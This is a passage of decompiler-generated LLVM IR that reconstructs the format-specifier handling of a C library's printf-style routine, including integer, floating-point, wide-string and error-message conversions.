  %v2_126a0 = xor i1 %v7_1269c, true
  %v3_126a0 = and i1 %v2_1269c, %v2_126a0
  %v7_12738 = icmp eq i32 %tmp104, 20
  %v1_12450 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37161)
  %v2_12450 = inttoptr i32 %v1_12450 to i8*
  %v2_1247c = xor i1 %v7_124f0, true
  %v3_1247c = and i1 %v2_124f0, %v2_1247c
  %v7_124b0 = icmp eq i32 %tmp104, 1
  %v2_124f8 = xor i1 %v2_124f0, true
  %v3_124f8 = or i1 %v7_124f0, %v2_124f8
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_12560 = icmp eq i32 %tmp104, 3
  %v11_1256c = icmp eq i32 %tmp104, 4
  %v9_123dc = mul nuw nsw i32 %v4_123cc, 8
  %v10_123dc = add i32 %v7_123d4, %v9_123dc
  br label %dec_label_pc_1233c.outer

dec_label_pc_1233c.outer:                         ; preds = %dec_label_pc_1291c, %dec_label_pc_122e8
  %v0_1233c45 = phi i32 [ %v3_1291c, %dec_label_pc_1291c ], [ %v0_12338, %dec_label_pc_122e8 ]
  %v0_12470 = phi i32 [ %stack_var_-336.4, %dec_label_pc_1291c ], [ %tmp103, %dec_label_pc_122e8 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_1291c ], [ 0, %dec_label_pc_122e8 ]
  br label %dec_label_pc_1233c.outer36

dec_label_pc_1233c.outer36:                       ; preds = %dec_label_pc_1233c.outer, %dec_label_pc_12928
  %v0_1233c44 = phi i32 [ %v0_1233c45, %dec_label_pc_1233c.outer ], [ %v1_12928, %dec_label_pc_12928 ]
  %v5_12368 = phi i32 [ %v0_1233c45, %dec_label_pc_1233c.outer ], [ %v1_12398, %dec_label_pc_12928 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_1233c.outer ], [ %v1_12808, %dec_label_pc_12928 ]
  %v1_1233c188 = inttoptr i32 %v0_1233c44 to i8*
  %v2_1233c189 = load i8, i8* %v1_1233c188, align 1
  %v2_12340191 = icmp eq i8 %v2_1233c189, 0
  br i1 %v2_12340191, label %dec_label_pc_12358, label %bb138

bb138:                                            ; preds = %dec_label_pc_1233c.outer36, %.thread6
  %v2_1233c193 = phi i8 [ %v2_1233c, %.thread6 ], [ %v2_1233c189, %dec_label_pc_1233c.outer36 ]
  %v1_12350192 = phi i32 [ %v2_12350, %.thread6 ], [ %v0_1233c44, %dec_label_pc_1233c.outer36 ]
  %v8_12344 = icmp eq i8 %v2_1233c193, 37
  br i1 %v8_12344, label %dec_label_pc_12358, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12350 = add i32 %v1_12350192, 1
  store i32 %v2_12350, i32* @r4, align 4
  %v1_1233c = inttoptr i32 %v2_12350 to i8*
  %v2_1233c = load i8, i8* %v1_1233c, align 1
  %v2_12340 = icmp eq i8 %v2_1233c, 0
  br i1 %v2_12340, label %dec_label_pc_12358, label %bb138

dec_label_pc_12358:                               ; preds = %bb138, %.thread6, %dec_label_pc_1233c.outer36
  %v1_12350.lcssa = phi i32 [ %v0_1233c44, %dec_label_pc_1233c.outer36 ], [ %v2_12350, %.thread6 ], [ %v1_12350192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12358 = sub i32 %v1_12350.lcssa, %v5_12368
  %v9_12358 = icmp eq i32 %v1_12350.lcssa, %v5_12368
  br i1 %v9_12358, label %dec_label_pc_1238c, label %dec_label_pc_12360

dec_label_pc_12360:                               ; preds = %dec_label_pc_12358
  store i32 %v2_12358, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_12358, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_12360
  store i32 %v5_12368, i32* %r0.global-to-local, align 4
  %v5_12370 = load i32, i32* @fp, align 4
  store i32 %v5_12370, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_12360, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_12360 ]
  store i32 74616, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_13a68.387 to i32))
  %v0_12378 = load i32, i32* %r0.global-to-local, align 4
  %v1_12378 = load i32, i32* @r5, align 4
  %v9_12378 = icmp eq i32 %v0_12378, %v1_12378
  br i1 %v9_12378, label %dec_label_pc_12380, label %dec_label_pc_12930

dec_label_pc_12380:                               ; preds = %bb142
  %v2_12384 = add i32 %v0_12378, %stack_var_-356.1.ph37
  %v0_1238c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1238c

dec_label_pc_1238c:                               ; preds = %dec_label_pc_12358, %dec_label_pc_12380
  %v0_123a0 = phi i32 [ %v5_12368, %dec_label_pc_12358 ], [ %v0_1238c.pre, %dec_label_pc_12380 ]
  %v1_12808 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_12358 ], [ %v2_12384, %dec_label_pc_12380 ]
  %v1_1238c = inttoptr i32 %v0_123a0 to i8*
  %v2_1238c = load i8, i8* %v1_1238c, align 1
  %v2_12390 = icmp eq i8 %v2_1238c, 0
  br i1 %v2_12390, label %dec_label_pc_12938, label %dec_label_pc_12398

dec_label_pc_12398:                               ; preds = %dec_label_pc_1238c
  %v1_12398 = add i32 %v0_123a0, 1
  %v2_12398 = inttoptr i32 %v1_12398 to i8*
  %v3_12398 = load i8, i8* %v2_12398, align 1
  %v7_1239c = icmp eq i8 %v3_12398, 37
  store i32 %v1_12398, i32* %r2.global-to-local, align 4
  br i1 %v7_1239c, label %dec_label_pc_12928, label %dec_label_pc_123a8

dec_label_pc_123a8:                               ; preds = %dec_label_pc_12398
  store i32 %v2_12288, i32* @r4, align 4
  store i32 %v2_12288, i32* %r0.global-to-local, align 4
  store i32 %v1_12398, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_123bc = call i32 @_ppfs_parsespec(i8* %v1_123bc)
  store i32 %v2_12288, i32* @r0, align 4
  %v0_123c4 = call i32 @_ppfs_setargs()
  store i32 %v0_123c4, i32* %r0.global-to-local, align 4
  store i32 %v4_123cc, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_123a8
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_123a8, %bb145
  %storemerge = phi i32 [ %v10_123dc, %bb145 ], [ %v7_123d8, %dec_label_pc_123a8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_12404195, label %dec_label_pc_123e8, label %dec_label_pc_12408

dec_label_pc_123e8:                               ; preds = %bb146, %dec_label_pc_123e8
  %v5_123f4197 = phi i32 [ %v5_123f4, %dec_label_pc_123e8 ], [ %v2_123f0, %bb146 ]
  %v0_123e8196 = phi i32 [ %v1_123ec, %dec_label_pc_123e8 ], [ %storemerge, %bb146 ]
  %v2_123e8 = add i32 %v5_123f4197, -32
  %v3_123e8 = inttoptr i32 %v2_123e8 to i32*
  store i32 %v0_123e8196, i32* %v3_123e8, align 4
  %v0_123ec = load i32, i32* %r0.global-to-local, align 4
  %v1_123ec = add i32 %v0_123ec, 8
  store i32 %v1_123ec, i32* %r0.global-to-local, align 4
  %v1_123f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_123f4 = mul i32 %v1_123f4.pre, 4
  %v5_123f4 = add i32 %v4_123f4, %v2_123f0
  %v1_12400 = add i32 %v1_123f4.pre, 1
  store i32 %v1_12400, i32* %r2.global-to-local, align 4
  %v5_12404 = icmp slt i32 %v1_123f4.pre, %tmp105
  br i1 %v5_12404, label %dec_label_pc_123e8, label %dec_label_pc_12408

dec_label_pc_12408:                               ; preds = %dec_label_pc_123e8, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_1240c, label %dec_label_pc_12414, label %dec_label_pc_12438

dec_label_pc_12414:                               ; preds = %dec_label_pc_12408
  %v3_12414 = load i32, i32* %stack_var_-72, align 4
  %v1_12420 = inttoptr i32 %v3_12414 to i32*
  %v2_12420 = load i32, i32* %v1_12420, align 4
  store i32 %v2_12420, i32* %r0.global-to-local, align 4
  %v1_12424 = and i32 %v0_12470, 3840
  store i32 %v1_12808, i32* %r2.global-to-local, align 4
  %v3_1242c = ashr i32 %v1_12808, 31
  %v4_12430 = inttoptr i32 %v2_12420 to i16*
  %v5_12430 = call i32 @_store_inttype(i16* %v4_12430, i32 %v1_12424, i32 %v1_12808, i32 %v3_1242c)
  store i32 %v5_12430, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1291c

dec_label_pc_12438:                               ; preds = %dec_label_pc_12408
  br i1 %tmp207, label %dec_label_pc_125d4, label %dec_label_pc_12440

dec_label_pc_12440:                               ; preds = %dec_label_pc_12438
  %v3_12450 = load i8, i8* %v2_12450, align 1
  %v4_12450 = zext i8 %v3_12450 to i32
  %v7_12454 = icmp eq i8 %v3_12450, 10
  br i1 %v7_12454, label %dec_label_pc_12460, label %bb147

bb147:                                            ; preds = %dec_label_pc_12440
  br label %bb151

dec_label_pc_12460:                               ; preds = %dec_label_pc_12440
  %v1_12470 = and i32 %v0_12470, 64
  %v2_12470 = icmp eq i32 %v1_12470, 0
  br i1 %v2_12470, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_12460
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_12460, %bb150
  br i1 %v3_1247c, label %.thread, label %dec_label_pc_12484

.thread:                                          ; preds = %bb151
  %v5_1247c = sub nsw i32 0, %v4_12450
  br label %dec_label_pc_1249c

dec_label_pc_12484:                               ; preds = %bb151
  br i1 %v7_12560, label %bb152, label %dec_label_pc_12490

bb152:                                            ; preds = %dec_label_pc_12484
  br label %dec_label_pc_1249c

dec_label_pc_12490:                               ; preds = %dec_label_pc_12484
  br i1 %v7_124b0, label %dec_label_pc_124a0, label %dec_label_pc_1249c

dec_label_pc_1249c:                               ; preds = %.thread, %bb152, %dec_label_pc_12490
  %v0_124c881 = phi i32 [ %v5_1247c, %.thread ], [ %v4_12450, %bb152 ], [ %v4_12450, %dec_label_pc_12490 ]
  br label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %dec_label_pc_12490, %dec_label_pc_1249c
  %v0_124c880 = phi i32 [ %v0_124c881, %dec_label_pc_1249c ], [ %v4_12450, %dec_label_pc_12490 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_1249c ], [ 6, %dec_label_pc_12490 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_124a0 = load i32, i32* %stack_var_-348, align 4
  %v1_124a4 = icmp slt i32 %v3_124a0, 0
  %v7_124a8. = select i1 %v1_124a4, i32 %v7_124a8, i32 32
  store i32 %v7_124a8., i32* @sb, align 4
  br i1 %v7_124b0, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_124a0
  store i32 %v2_123f0, i32* %r2.global-to-local, align 4
  %v2_124b8 = load i32, i32* @ip, align 4
  %v5_124b8 = mul i32 %v2_124b8, 4
  %v6_124b8 = add i32 %v5_124b8, %v2_123f0
  %v2_124bc = add i32 %v6_124b8, -276
  %v3_124bc = inttoptr i32 %v2_124bc to i32*
  %v4_124bc = load i32, i32* %v3_124bc, align 4
  %v2_124c4 = and i32 %v4_124bc, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_124a0, %.thread15
  %storemerge93 = phi i32 [ %v2_124c4, %.thread15 ], [ 1024, %dec_label_pc_124a0 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_124c880, i32* @r2, align 4
  %v3_124cc = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_124cc, i32* @r1, align 4
  %v0_124d0 = call i32 @_load_inttype()
  store i32 %v0_124d0, i32* @r2, align 4
  %v0_124dc = load i32, i32* @r1, align 4
  store i32 %v0_124dc, i32* @r3, align 4
  store i32 %v2_124e0, i32* %r0.global-to-local, align 4
  %v2_124e8 = call i32 @_uintmaxtostr(i8* %v1_124e8)
  store i32 %v2_124e8, i32* %r0.global-to-local, align 4
  store i32 %v2_124e8, i32* @r4, align 4
  br i1 %v3_124f8, label %bb160, label %dec_label_pc_124fc

dec_label_pc_124fc:                               ; preds = %bb157
  %v3_124e8 = inttoptr i32 %v2_124e8 to i8*
  %v3_124fc = load i8, i8* %v3_124e8, align 1
  %v7_12500 = icmp eq i8 %v3_124fc, 45
  %v2_12508 = or i32 %v0_12470, 2
  %v2_12508.stack_var_-336.0 = select i1 %v7_12500, i32 %v2_12508, i32 %v0_12470
  br i1 %v7_12500, label %.thread17, label %dec_label_pc_1251c

.thread17:                                        ; preds = %dec_label_pc_124fc
  %v3_1250c = add i32 %v2_124e8, 1
  store i32 %v3_1250c, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_1251c:                               ; preds = %dec_label_pc_124fc
  %v1_1251c = and i32 %v2_12508.stack_var_-336.0, 2
  %v2_1251c = icmp eq i32 %v1_1251c, 0
  br i1 %v2_1251c, label %dec_label_pc_12528, label %bb158

bb158:                                            ; preds = %dec_label_pc_1251c
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_12528:                               ; preds = %dec_label_pc_1251c
  %v1_12528 = urem i32 %v2_12508.stack_var_-336.0, 2
  %v2_12528 = icmp eq i32 %v1_12528, 0
  br i1 %v2_12528, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_12528
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_12528, %bb159
  %v0_12584 = phi i32 [ %v2_124e8, %bb157 ], [ %v3_1250c, %.thread17 ], [ %v2_124e8, %dec_label_pc_12528 ], [ %v2_124e8, %bb159 ], [ %v2_124e8, %bb158 ]
  %v0_12540 = phi i32 [ %v0_12470, %bb157 ], [ %v2_12508, %.thread17 ], [ %v0_12470, %dec_label_pc_12528 ], [ %v0_12470, %bb159 ], [ %v0_12470, %bb158 ]
  %v3_12530 = load i32, i32* %stack_var_-348, align 4
  %v1_12538 = icmp slt i32 %v3_12530, 0
  br i1 %v1_12538, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_12530, %bb160 ]
  %v0_12568 = phi i32 [ 1, %bb161 ], [ %v3_12530, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_12540 = and i32 %v0_12540, 16
  %v2_12540 = icmp eq i32 %v1_12540, 0
  %v2_1254c = sub i32 %v2_124e0, %v0_12584
  store i32 %v2_1254c, i32* @r5, align 4
  br i1 %v2_12540, label %bb169, label %dec_label_pc_12554

dec_label_pc_12554:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_12554
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_12554, %bb163
  br i1 %v7_12560, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_12568, %v2_1254c
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_1256c, label %dec_label_pc_12574, label %bb169

dec_label_pc_12574:                               ; preds = %bb167
  %v1_12574 = inttoptr i32 %v0_12584 to i8*
  %v2_12574 = load i8, i8* %v1_12574, align 1
  %v7_12578 = icmp eq i8 %v2_12574, 48
  br i1 %v7_12578, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_12574
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_12574
  %v2_12580 = add i32 %v2_1254c, 1
  store i32 %v2_12580, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_125c4 = phi i32 [ %v0_12568, %bb167 ], [ %v0_12568, %bb162 ], [ 1, %bb168 ], [ %v2_12580, %.thread24 ], [ %v0_12568, %bb166 ]
  %v1_12584 = inttoptr i32 %v0_12584 to i8*
  %v2_12584 = load i8, i8* %v1_12584, align 1
  %v7_12588 = icmp eq i8 %v2_12584, 48
  br i1 %v7_12588, label %dec_label_pc_12590, label %dec_label_pc_125c0

dec_label_pc_12590:                               ; preds = %bb169
  %v0_12594 = load i32, i32* @r6, align 4
  %v7_12598 = icmp slt i32 %v0_12594, 6
  br i1 %v7_12598, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_12590
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_12590, %bb170
  br i1 %v7_124b0, label %.thread27, label %dec_label_pc_125b4

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37188), i32* @r4, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125b4:                               ; preds = %bb171
  %v2_125b4 = icmp eq i32 %v5_125c4, 0
  br i1 %v2_125b4, label %bb172, label %dec_label_pc_125c0

bb172:                                            ; preds = %dec_label_pc_125b4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125b4, %bb169
  %v2_125c0 = sub i32 %v5_125c4, %v2_1254c
  %tmp211 = icmp ugt i32 %v5_125c4, %v2_1254c
  br i1 %tmp211, label %.thread85, label %dec_label_pc_125cc

.thread85:                                        ; preds = %dec_label_pc_125c0
  store i32 %v2_125c0, i32* @r8, align 4
  br label %dec_label_pc_127d8thread-pre-split

dec_label_pc_125cc:                               ; preds = %dec_label_pc_125c0, %.thread27, %bb172
  %v1_127dc.pre205 = phi i32 [ %v2_1254c, %dec_label_pc_125c0 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_127d8thread-pre-split

dec_label_pc_125d4:                               ; preds = %dec_label_pc_12438
  br i1 %tmp208, label %dec_label_pc_12614, label %dec_label_pc_125dc

dec_label_pc_125dc:                               ; preds = %dec_label_pc_125d4
  %v3_125ec = load i32, i32* %stack_var_-72, align 4
  %v0_125f0 = load i32, i32* @fp, align 4
  store i32 %v0_125f0, i32* %r0.global-to-local, align 4
  %v1_125f4 = inttoptr i32 %v3_125ec to i32*
  %v2_125f4 = load i32, i32* %v1_125f4, align 4
  store i32 %v2_125f4, i32* %r2.global-to-local, align 4
  %v3_125f4 = add i32 %v3_125ec, 4
  %v4_125f4 = inttoptr i32 %v3_125f4 to i32*
  %v5_125f4 = load i32, i32* %v4_125f4, align 4
  %v8_125f8 = call i32 @_fpmaxtostr(i32 %v0_125f0, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -52756) to i64) to double), i32 %v2_125f4, i32 %v5_125f4, i32 %v2_12788, i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -52756))
  store i32 %v8_125f8, i32* %r0.global-to-local, align 4
  %v1_125fc = icmp slt i32 %v8_125f8, 0
  br i1 %v1_125fc, label %dec_label_pc_12930, label %dec_label_pc_12604

dec_label_pc_12604:                               ; preds = %dec_label_pc_125dc
  %v2_12608 = add i32 %v8_125f8, %v1_12808
  store i32 %v2_12608, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1291c

dec_label_pc_12614:                               ; preds = %dec_label_pc_125d4
  br i1 %v3_12618, label %dec_label_pc_1269c, label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %dec_label_pc_12614
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_12624 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_12624, i32* %r0.global-to-local, align 4
  br i1 %v7_12614, label %dec_label_pc_1262c, label %dec_label_pc_12664

dec_label_pc_1262c:                               ; preds = %dec_label_pc_1261c
  %v1_1262c = inttoptr i32 %v3_12624 to i32*
  %v2_1262c = load i32, i32* %v1_1262c, align 4
  %v9_12630 = icmp eq i32 %v2_1262c, 0
  store i32 %v2_1262c, i32* %stack_var_-44, align 4
  br i1 %v9_12630, label %dec_label_pc_126dc, label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %dec_label_pc_1262c
  %v3_1263c = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_12640, i32* @r0, align 4
  %v4_12644 = ashr i32 %v3_1263c, 31
  %v5_12644 = or i32 %v4_12644, %v3_1263c
  store i32 %v5_12644, i32* %r2.global-to-local, align 4
  store i32 %v2_12640, i32* @r1, align 4
  %v6_12650 = call i32 @__GI_wcsrtombs(i32 %v2_12640, i32 %v2_12640, i32 %v5_12644, i32 %v2_1264c, i32 0, i32 %v2_1262c)
  store i32 %v6_12650, i32* %r0.global-to-local, align 4
  %v3_12654 = icmp eq i32 %v6_12650, -1
  store i32 %v6_12650, i32* @r5, align 4
  br i1 %v3_12654, label %dec_label_pc_12930, label %dec_label_pc_127c8

dec_label_pc_12664:                               ; preds = %dec_label_pc_1261c
  store i32 %v2_12744, i32* %r7.global-to-local, align 4
  %v1_12668 = inttoptr i32 %v3_12624 to i32*
  %v2_12668 = load i32, i32* %v1_12668, align 4
  store i32 %v2_1264c, i32* %r2.global-to-local, align 4
  store i32 %v2_12744, i32* %r0.global-to-local, align 4
  %v5_12674 = call i32 @__GI_wcrtomb(i32 %v2_12744, i32 %v2_12668, i32 %v2_1264c, i32 %tmp105, i32 0)
  store i32 %v5_12674, i32* %r0.global-to-local, align 4
  %v7_12678 = icmp eq i32 %v5_12674, -1
  store i32 %v5_12674, i32* @r5, align 4
  br i1 %v7_12678, label %dec_label_pc_12930, label %dec_label_pc_12684

dec_label_pc_12684:                               ; preds = %dec_label_pc_12664
  %v0_12684 = load i32, i32* @sl, align 4
  store i32 %v0_12684, i32* @r8, align 4
  store i32 %v2_12744, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_12694 = trunc i32 %v0_12684 to i8
  %v2_12694 = load i32, i32* %r7.global-to-local, align 4
  %v4_12694 = add i32 %v2_12694, %v5_12674
  %v5_12694 = inttoptr i32 %v4_12694 to i8*
  store i8 %v1_12694, i8* %v5_12694, align 1
  %v0_127dc.pre.pre = load i32, i32* @r8, align 4
  %v1_127dc.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_127d8thread-pre-split

dec_label_pc_1269c:                               ; preds = %dec_label_pc_12614
  br i1 %v3_126a0, label %dec_label_pc_12738, label %dec_label_pc_126a4

dec_label_pc_126a4:                               ; preds = %dec_label_pc_1269c
  %v3_126a4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_126a4, i32* %r0.global-to-local, align 4
  %v1_126ac = inttoptr i32 %v3_126a4 to i32*
  %v2_126ac = load i32, i32* %v1_126ac, align 4
  br i1 %v7_1269c, label %dec_label_pc_126ac, label %dec_label_pc_12710

dec_label_pc_126ac:                               ; preds = %dec_label_pc_126a4
  store i32 %v2_126ac, i32* @r4, align 4
  %v2_126b0 = icmp eq i32 %v2_126ac, 0
  br i1 %v2_126b0, label %dec_label_pc_126dc, label %dec_label_pc_126b8

dec_label_pc_126b8:                               ; preds = %dec_label_pc_126ac, %dec_label_pc_12740
  %v0_126bc = phi i32 [ %v2_126ac, %dec_label_pc_126ac ], [ %v3_12750, %dec_label_pc_12740 ]
  %v3_126b8 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_126bc, i32* %r0.global-to-local, align 4
  %v4_126c0 = ashr i32 %v3_126b8, 31
  %v5_126c0 = or i32 %v4_126c0, %v3_126b8
  %v2_126c4 = inttoptr i32 %v0_126bc to i8*
  %v3_126c4 = call i32 @strnlen(i8* %v2_126c4, i32 %v5_126c0)
  store i32 %v3_126c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_126c4, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_127d8

dec_label_pc_126dc:                               ; preds = %dec_label_pc_126ac, %dec_label_pc_1262c
  %v3_126dc = load i32, i32* %stack_var_-348, align 4
  %v1_126e0 = icmp slt i32 %v3_126dc, 0
  br i1 %v1_126e0, label %dec_label_pc_126f8, label %dec_label_pc_126e8

dec_label_pc_126e8:                               ; preds = %dec_label_pc_126dc
  %tmp212 = icmp ult i32 %v3_126dc, 6
  br i1 %tmp212, label %dec_label_pc_12700, label %dec_label_pc_126f8

dec_label_pc_126f8:                               ; preds = %dec_label_pc_126e8, %dec_label_pc_126dc
  br label %dec_label_pc_12700

dec_label_pc_12700:                               ; preds = %dec_label_pc_126e8, %dec_label_pc_126f8
  %storemerge97 = phi i32 [ 6, %dec_label_pc_126f8 ], [ 0, %dec_label_pc_126e8 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37180), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_127d8

dec_label_pc_12710:                               ; preds = %dec_label_pc_126a4
  store i32 %v2_126ac, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_12744, i32* @r4, align 4
  store i32 %v2_126ac, i32* %stack_var_-200, align 4
  br label %dec_label_pc_127d8thread-pre-split

dec_label_pc_12738:                               ; preds = %dec_label_pc_1269c
  br i1 %v7_12738, label %dec_label_pc_12740, label %dec_label_pc_1275c

dec_label_pc_12740:                               ; preds = %dec_label_pc_12738
  %v0_12740 = call i32 @__GI___errno_location()
  store i32 %v0_12740, i32* %r0.global-to-local, align 4
  %v1_12748 = inttoptr i32 %v0_12740 to i32*
  %v2_12748 = load i32, i32* %v1_12748, align 4
  store i32 %v2_12748, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_12750 = call i32 @__GI___glibc_strerror_r(i32 %v2_12748, i32 %v2_12744, i32 128)
  store i32 %v3_12750, i32* %r0.global-to-local, align 4
  store i32 %v3_12750, i32* @r4, align 4
  br label %dec_label_pc_126b8

dec_label_pc_1275c:                               ; preds = %dec_label_pc_12738
  %v4_12764 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 728) to i32*), align 4
  %v1_1276c = add i32 %v4_12764, 10
  store i32 %v1_1276c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12770

dec_label_pc_12770:                               ; preds = %dec_label_pc_127b8, %dec_label_pc_1275c
  %v1_12780 = phi i32 [ %v1_127b8, %dec_label_pc_127b8 ], [ %v4_12764, %dec_label_pc_1275c ]
  %v1_12770 = inttoptr i32 %v1_12780 to i8*
  %v2_12770 = load i8, i8* %v1_12770, align 1
  %v3_12770 = zext i8 %v2_12770 to i32
  store i32 %v3_12770, i32* %r2.global-to-local, align 4
  %v9_12778 = icmp eq i32 %v3_12770, %tmp99
  br i1 %v9_12778, label %dec_label_pc_12780, label %dec_label_pc_127b8

dec_label_pc_12780:                               ; preds = %dec_label_pc_12770
  %v2_12780 = sub i32 %v1_12780, %v4_12764
  %v0_12784 = load i32, i32* @fp, align 4
  store i32 %v0_12784, i32* %r0.global-to-local, align 4
  store i32 %v2_1278c, i32* %r2.global-to-local, align 4
  %v4_12794 = mul i32 %v2_12780, 4
  %v5_12794 = add i32 %v4_12794, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 10528)
  %v6_12794 = inttoptr i32 %v5_12794 to i32*
  %v7_12794 = load i32, i32* %v6_12794, align 4
  store i32 75680, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_12794)
  %v0_127a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_127a0 = icmp slt i32 %v0_127a0, 0
  br i1 %v1_127a0, label %dec_label_pc_12930, label %dec_label_pc_127a8

dec_label_pc_127a8:                               ; preds = %dec_label_pc_12780
  %v2_127ac = add i32 %v0_127a0, %v1_12808
  br label %dec_label_pc_1291c

dec_label_pc_127b8:                               ; preds = %dec_label_pc_12770
  %v1_127b8 = add i32 %v1_12780, 1
  %v3_127bc = icmp ult i32 %v1_127b8, %v1_1276c
  br i1 %v3_127bc, label %dec_label_pc_12770, label %dec_label_pc_12930

dec_label_pc_127c8:                               ; preds = %dec_label_pc_1263c
  %v0_127c8 = load i32, i32* @sl, align 4
  store i32 %v0_127c8, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_127c8, i32* @r4, align 4
  br label %dec_label_pc_127d8

dec_label_pc_127d8thread-pre-split:               ; preds = %.thread85, %dec_label_pc_125cc, %dec_label_pc_12684, %dec_label_pc_12710
  %v1_127dc.pre = phi i32 [ %v1_127dc.pre205, %dec_label_pc_125cc ], [ %v1_127dc.pre.pre, %dec_label_pc_12684 ], [ 1, %dec_label_pc_12710 ], [ %v2_1254c, %.thread85 ]
  %v0_127dc.pre = phi i32 [ 0, %dec_label_pc_125cc ], [ %v0_127dc.pre.pre, %dec_label_pc_12684 ], [ 0, %dec_label_pc_12710 ], [ %v2_125c0, %.thread85 ]
